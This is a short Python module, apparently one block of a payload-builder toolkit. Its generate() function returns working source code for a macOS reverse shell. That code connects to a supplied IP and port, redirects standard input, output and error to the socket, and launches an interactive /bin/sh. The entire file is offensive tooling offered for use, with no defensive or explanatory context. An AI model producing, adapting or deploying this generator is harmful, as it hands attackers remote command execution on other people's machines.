# builder/blocks/base/reverse_shell.macos.python.base.short.py

METADATA = {
    "name":       "reverse_shell",
    "platform":   "macos",
    "language":   "python",
    "category":   "base",
    "variant":    "default",
    "args":       ["ip", "port"],
    "returns":    "str",
}

def generate(ip: str, port: int) -> str:
    """Return Python source code for a reverse shell."""
    return f'''
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(({ip!r}, {port}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
'''
